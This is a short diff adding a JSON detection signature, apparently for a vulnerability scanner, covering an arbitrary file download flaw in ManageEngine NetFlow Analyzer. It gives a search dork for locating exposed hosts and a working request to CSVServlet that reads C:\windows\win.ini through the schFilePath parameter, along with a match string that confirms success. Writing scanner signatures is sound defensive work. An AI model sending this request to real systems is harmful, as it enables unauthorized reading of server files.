@@ -1,0 +1,14 @@
+{
+    "name": "ManageEngine_NetFlowAnalyzer_ArbitraryFileDownload",
+    "method": "GET",
+    "port": [
+        8080
+    ],
+    "dork": "body=NetworkSnapShot",
+    "suffix": [
+        "/netflow/servlet/CSVServlet?schFilePath=C:\\windows\\win.ini"
+    ],
+    "hits": [
+        "-bit app support"
+    ]
+}
